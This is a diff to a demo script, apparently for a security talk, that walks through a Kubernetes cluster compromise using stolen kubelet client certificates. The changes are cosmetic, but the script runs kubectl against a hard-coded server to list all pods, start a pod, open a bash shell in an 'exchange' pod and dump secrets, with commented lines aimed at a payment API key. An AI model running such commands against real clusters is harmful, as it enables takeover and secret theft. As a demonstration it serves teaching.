@@ -16,8 +16,11 @@ if [ ! -f $DEMOMAGIC ]; then
 fi
 
 DEMO_PROMPT="attacker_machine$ "
-. demo-magic.sh -d
+. demo-magic.sh
+RED="\033[0;91m"
 clear
+echo ""
+echo ""
 
 # Not sure this is worth demonstrating, cover in the slide.
 #p "curl -X POST -H \"Content-Type: application/json\" -d '{\"access_token\":ya29.c...}' https://www.googleapis.com/oauth2/v2/tokeninfo"
@@ -37,21 +40,21 @@ clear
 
 # empty kubeconfig to make sure we're acting as the kubelet
 export KUBECONFIG=$(mktemp /tmp/kubeconfig.XXXXXX)
-p "kubectl --client-certificate ../kubelet_keys/client.crt \ "
+p "${RED}kubectl --client-certificate ../kubelet_keys/client.crt \ "
 DEMO_PROMPT="> "
-p "--client-key ../kubelet_keys/client.pem \ "
-p "--certificate-authority ../kubelet_keys/ca.crt \ "
-p "get pods --all-namespaces"
+p "${RED}--client-key ../kubelet_keys/client.pem \ "
+p "${RED}--certificate-authority ../kubelet_keys/ca.crt \ "
+p "${RED}get pods --all-namespaces${COLOR_RESET}"
 DEMO_PROMPT="attacker_machine$ "
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods --all-namespaces
-p "kubectl run newnx --image=nginx"
+p "${RED}kubectl run newnx --image=nginx${COLOR_RESET}"
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 run newnx --image=nginx || true
 EXCHANGE=$(kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get pods -n exchange --selector=app=exchange --output=jsonpath={.items..metadata.name})
-p "kubectl exec -it ${EXCHANGE} -- /bin/bash"
+p "${RED}kubectl exec -it ${EXCHANGE} -- /bin/bash${COLOR_RESET}"
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key \
 ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt \
 --server https://35.185.243.113 -n exchange exec -it ${EXCHANGE} -- /bin/bash || true
-p "kubectl get secrets"
+p "${RED}kubectl get secrets${COLOR_RESET}"
 kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secrets
 #p "kubectl get payment-api-key"
 #kubectl --client-certificate ../kubelet_keys/client.crt --client-key ../kubelet_keys/client.pem --certificate-authority ../kubelet_keys/ca.crt --server https://35.185.243.113 get secret payment-api-key
